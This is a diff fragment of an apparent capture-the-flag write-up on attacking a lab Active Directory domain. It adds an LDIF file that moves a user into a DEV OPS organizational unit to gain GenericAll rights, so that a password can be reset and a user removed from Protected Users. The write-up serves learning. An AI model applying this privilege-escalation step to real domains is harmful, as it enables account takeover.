@@ -1449,7 +1449,17 @@ Remembering the user `m.ibabao` and checking that user in bloodhound they are a 
 
 # Removing `m.ibabao` from the protected users group
 
-Both `l.fortra` and `p.bruce` have the privileges to do this so similar to what i did earlier ill move the one of them to the dev ops OU to get genericAll then i can reset the password
+Both `l.forta` and `p.bruce` have the privileges to do this so similar to what i did earlier ill move the one of them to the dev ops OU to get genericAll then i can reset the password
+
+```python
+cat lfortra.ldif              
+dn: CN=LUIS FORTA,OU=SENIOR DEV OPS,DC=NOVACART,DC=LOCAL
+changetype: moddn
+newrdn: CN=LUIS FORTA
+deleteoldrdn: 1
+newsuperior: OU=DEV OPS,DC=NOVACART,DC=LOCAL
+```
+Ill make the ldif file
 
 ```python
 
